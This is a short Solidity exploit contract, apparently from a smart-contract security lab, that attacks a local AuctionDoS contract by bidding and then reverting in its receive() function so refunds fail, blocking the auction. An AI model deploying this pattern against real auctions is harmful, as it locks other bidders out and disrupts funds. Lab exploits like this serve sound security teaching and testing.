// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {AuctionDoS} from "../src/AuctionDoS.sol";

contract ExploitModule {
    AuctionDoS public targetContract;

    constructor(address _target) payable {
        targetContract = AuctionDoS(payable(_target));
    }

    function runExploit() external payable {
        // First bid to set up the DoS scenario
        targetContract.bid{value: 1 ether}();
        
        // Second bid to trigger the DoS
        payable(address(targetContract)).call{value: 2 ether}("");
    }

    receive() external payable {
        // Revert to prevent refund
        revert();
    }
}